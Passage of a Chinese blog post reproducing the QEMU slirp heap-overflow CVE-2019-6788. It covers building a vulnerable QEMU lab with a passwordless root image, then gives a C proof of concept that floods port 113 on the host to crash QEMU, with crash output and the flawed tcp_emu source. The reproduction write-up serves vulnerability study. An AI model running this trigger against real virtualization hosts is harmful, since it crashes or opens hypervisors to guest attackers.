<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CVE-2019-6788-Qemu逃逸漏洞复现-分析 | LYYL' Blog</title><meta name="keywords" content="LYYL, Blog, Pwn, pwn"><meta name="author" content="LYYL"><meta name="copyright" content="LYYL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CVE-2019-6788是一个qemu的逃逸漏洞，本文参考xmzyshypnc和raycp的文章 环境搭建首先是创建qemu启动所用的文件系统，需要安装debootstrap，创建完成后的文件系统带有ssh，ssh&#x2F;id_rsa为私钥。 12345678910111213141516171819202122232425262728293031323334353637mkdir qemusudo">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-6788-Qemu逃逸漏洞复现-分析">
<meta property="og:url" content="https://www.lyyl.online/posts/882088222.html">
<meta property="og:site_name" content="LYYL&#39; Blog">
<meta property="og:description" content="CVE-2019-6788是一个qemu的逃逸漏洞，本文参考xmzyshypnc和raycp的文章 环境搭建首先是创建qemu启动所用的文件系统，需要安装debootstrap，创建完成后的文件系统带有ssh，ssh&#x2F;id_rsa为私钥。 12345678910111213141516171819202122232425262728293031323334353637mkdir qemusudo">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg">
<meta property="article:published_time" content="2021-01-29T14:07:32.000Z">
<meta property="article:modified_time" content="2022-05-26T07:56:59.326Z">
<meta property="article:author" content="LYYL">
<meta property="article:tag" content="LYYL, Blog, Pwn, pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg"><link rel="shortcut icon" href="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png"><link rel="canonical" href="https://www.lyyl.online/posts/882088222"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-8740935439028405',
  enable_page_level_ads: 'true'
});</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-MBZHBXMDJ2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-MBZHBXMDJ2');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2019-6788-Qemu逃逸漏洞复现-分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-26 15:56:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-31.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">LYYL' Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2019-6788-Qemu逃逸漏洞复现-分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2021-01-29T14:07:32.000Z" title="undefined 2021-01-29 22:07:32">2021-01-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>54分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2019-6788-Qemu逃逸漏洞复现-分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><code>CVE-2019-6788</code>是一个<code>qemu</code>的逃逸漏洞，本文参考<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ama2in9.top/2021/01/02/cve-2019-6788/#more">xmzyshypnc</a>和<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2019-6788%E5%A0%86%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">raycp</a>的文章</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先是创建<code>qemu</code>启动所用的文件系统，需要安装<code>debootstrap</code>，创建完成后的文件系统带有<code>ssh</code>，<code>ssh/id_rsa</code>为私钥。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> qemu</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,\</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,\</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default \</span><br><span class="line">stretch qemu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">&#x27;/^root/ &#123; s/:x:/::/ &#125;&#x27;</span> qemu/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/inittab</span><br><span class="line"><span class="comment">#printf &#x27;\nauto enp0s3\niface enp0s3 inet dhcp\n&#x27; | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debugfs /sys/kernel/debug debugfs defaults 0 0&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;kernel.printk = 7 4 1 3&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;debug.exception-trace = 0&#x27;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_enable = 1&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.core.bpf_jit_harden = 2&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;net.ipv4.ping_group_range = 0 65535&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;127.0.0.1\tlocalhost\n&quot;</span> | sudo <span class="built_in">tee</span> qemu/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nameserver 8.8.8.8&quot;</span> | sudo <span class="built_in">tee</span> -a qemu/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ubuntu&quot;</span> | sudo <span class="built_in">tee</span> qemu/etc/hostname</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p qemu/root/.ssh/</span><br><span class="line"><span class="built_in">rm</span> -rf ssh</span><br><span class="line"><span class="built_in">mkdir</span> -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">cat</span> ssh/id_rsa.pub | sudo <span class="built_in">tee</span> qemu/root/.ssh/authorized_keys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=qemu.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F qemu.img</span><br><span class="line">sudo <span class="built_in">mkdir</span> -p /mnt/qemu</span><br><span class="line">sudo mount -o loop qemu.img /mnt/qemu</span><br><span class="line">sudo <span class="built_in">cp</span> -a qemu/. /mnt/qemu/.</span><br><span class="line">sudo umount /mnt/qemu</span><br></pre></td></tr></table></figure>

<p>接着是带有漏洞的<code>qemu</code>的编译，也就是首先下载<code>qemu</code>源码，然后切换到有漏洞的版本，再进行编译。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v3.1.0</span><br><span class="line"><span class="built_in">mkdir</span> -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>编译出来的为<code>./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64</code>，查看一下版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  qemu ./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 -version</span><br><span class="line">QEMU emulator version 3.1.0 (v3.1.0-dirty)</span><br><span class="line">Copyright (c) 2003-2018 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure>

<p>内核可以自行编译，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.2.11.tar.xz -O linux-5.2.11.tar.xz</span></span><br><span class="line">tar -xvf linux<span class="number">-5.2</span><span class="number">.11</span>.tar.xz</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">#编辑 .config 文件， 将 CONFIG_8139CP=y 和 CONFIG_PCNET32=y 打开</span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<p>需要保证下面的两个选项是开启的，否则启动的时候可能会出现网卡启动错误，因为对应的网卡驱动没有编译进去</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_8139CP=y  , rtl8139 驱动</span><br><span class="line">CONFIG_PCNET32=y , pcnet 驱动</span><br></pre></td></tr></table></figure>

<p>这里我是直接采用之前比赛中的内核。启动脚本如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">	-L pc-bios \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">	-hda ./rootfs.img \</span><br><span class="line">	-m 2G -nographic \</span><br><span class="line">	-net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure>

<p>这里使用<code>hostfwd</code>进行了端口转发，即将本机的<code>2222</code>端口转发到<code>qemu</code>虚拟机的<code>22</code>端口。因此我们向虚拟机中传输文件可以使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -i ./ssh/id_rsa -P2222 ./file root@localhost:/</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们先测试一下环境，将<code>exp</code>编译完毕之后传入到<code>qemu</code>虚拟机中执行，同时在本机监听端口<code>nc -lvknp 113</code>，<code>exp</code>如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> s, ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(<span class="string">&quot;10.0.2.2&quot;</span>); <span class="comment">// host IP</span></span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>);                   <span class="comment">// vulnerable port</span></span><br><span class="line">    ret = connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;ip_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        write(s, buf, <span class="number">0x500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行之后<code>qemu</code>崩溃。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ./exp</span></span><br><span class="line">connect res 0</span><br><span class="line">start.sh: line 7:   265 Segmentation fault      ./qemu-system-x86_64 -L pc-bios -kernel ./bzImage c</span><br></pre></td></tr></table></figure>

<p>注意的是这里的程序使用一次之后再次使用就不行了，不知道为什么，因此调试一次就需要重新拷贝一次。根据<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/Kira-cxy/qemu-vm-escape/blob/master/writeup_zh.md">writeup</a>，这里我们将断点设置在<code>tcp_emu</code>函数处。可以看到调用的堆栈如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► f <span class="number">0</span>     <span class="number">5570</span>c2d68d2d tcp_emu+<span class="number">28</span></span><br><span class="line">  f <span class="number">1</span>     <span class="number">5570</span>c2d651d9 tcp_input+<span class="number">3189</span></span><br><span class="line">  f <span class="number">2</span>     <span class="number">5570</span>c2d5bee4 ip_input+<span class="number">710</span></span><br><span class="line">  f <span class="number">3</span>     <span class="number">5570</span>c2d5f435 slirp_input+<span class="number">412</span></span><br><span class="line">  f <span class="number">4</span>     <span class="number">5570</span>c2d47669 net_slirp_receive+<span class="number">83</span></span><br><span class="line">  f <span class="number">5</span>     <span class="number">5570</span>c2d3d043 nc_sendv_compat+<span class="number">254</span></span><br><span class="line">  f <span class="number">6</span>     <span class="number">5570</span>c2d3d105 qemu_deliver_packet_iov+<span class="number">172</span></span><br><span class="line">  f <span class="number">7</span>     <span class="number">5570</span>c2d3fcbe qemu_net_queue_deliver_iov+<span class="number">80</span></span><br><span class="line">  f <span class="number">8</span>     <span class="number">5570</span>c2d3fe2d qemu_net_queue_send_iov+<span class="number">134</span></span><br><span class="line">  f <span class="number">9</span>     <span class="number">5570</span>c2d3d24a qemu_sendv_packet_async+<span class="number">289</span></span><br><span class="line">  f <span class="number">10</span>     <span class="number">5570</span>c2d3d277 qemu_sendv_packet+<span class="number">43</span></span><br></pre></td></tr></table></figure>

<p>结合源码调试可以发现该函数的实现位于<code>/slirp/tcp_subr.c</code>处。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">  <span class="title function_">tcp_emu</span><span class="params">(<span class="keyword">struct</span> socket *so, <span class="keyword">struct</span> mbuf *m)</span></span><br><span class="line">&#123;</span><br><span class="line">  Slirp *slirp = so-&gt;slirp;</span><br><span class="line">  u_int n1, n2, n3, n4, n5, n6;</span><br><span class="line">  <span class="type">char</span> buff[<span class="number">257</span>];</span><br><span class="line">  <span class="type">uint32_t</span> laddr;</span><br><span class="line">  u_int lport;</span><br><span class="line">  <span class="type">char</span> *bptr;</span><br><span class="line"></span><br><span class="line">  DEBUG_CALL(<span class="string">&quot;tcp_emu&quot;</span>);</span><br><span class="line">  DEBUG_ARG(<span class="string">&quot;so = %p&quot;</span>, so);</span><br><span class="line">  DEBUG_ARG(<span class="string">&quot;m = %p&quot;</span>, m);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(so-&gt;so_emu) &#123;</span><br><span class="line">      <span class="type">int</span> x, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> EMU_IDENT:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Identification protocol as per rfc-1413</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">tmpso</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">        <span class="type">socklen_t</span> addrlen = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sbuf</span> *<span class="title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);<span class="comment">// 拷贝数据</span></span><br><span class="line">        so_rcv-&gt;sb_wptr += m-&gt;m_len;</span><br><span class="line">        so_rcv-&gt;sb_rptr += m-&gt;m_len;</span><br><span class="line">        m-&gt;m_data[m-&gt;m_len] = <span class="number">0</span>; <span class="comment">/* NULL terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">&#x27;\r&#x27;</span>) || <span class="built_in">strchr</span>(m-&gt;m_data, <span class="string">&#x27;\n&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(so_rcv-&gt;sb_data, <span class="string">&quot;%u%*[ ,]%u&quot;</span>, &amp;n1, &amp;n2) == <span class="number">2</span>) &#123;</span><br><span class="line">            HTONS(n1);</span><br><span class="line">            HTONS(n2);</span><br><span class="line">            <span class="comment">/* n2 is the one on our host */</span></span><br><span class="line">            <span class="keyword">for</span> (tmpso = slirp-&gt;tcb.so_next;</span><br><span class="line">                 tmpso != &amp;slirp-&gt;tcb;</span><br><span class="line">                 tmpso = tmpso-&gt;so_next) &#123;</span><br><span class="line">              <span class="keyword">if</span> (tmpso-&gt;so_laddr.s_addr == so-&gt;so_laddr.s_addr &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_lport == n2 &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_faddr.s_addr == so-&gt;so_faddr.s_addr &amp;&amp;</span><br><span class="line">                  tmpso-&gt;so_fport == n1) &#123;</span><br><span class="line">                <span class="keyword">if</span> (getsockname(tmpso-&gt;s,</span><br><span class="line">                                (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;addrlen) == <span class="number">0</span>)</span><br><span class="line">                  n2 = ntohs(addr.sin_port);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          so_rcv-&gt;sb_cc = <span class="built_in">snprintf</span>(so_rcv-&gt;sb_data,</span><br><span class="line">                                   so_rcv-&gt;sb_datalen,</span><br><span class="line">                                   <span class="string">&quot;%d,%d\r\n&quot;</span>, n1, n2);</span><br><span class="line">          so_rcv-&gt;sb_rptr = so_rcv-&gt;sb_data;</span><br><span class="line">          so_rcv-&gt;sb_wptr = so_rcv-&gt;sb_data + so_rcv-&gt;sb_cc;</span><br><span class="line">        &#125;</span><br><span 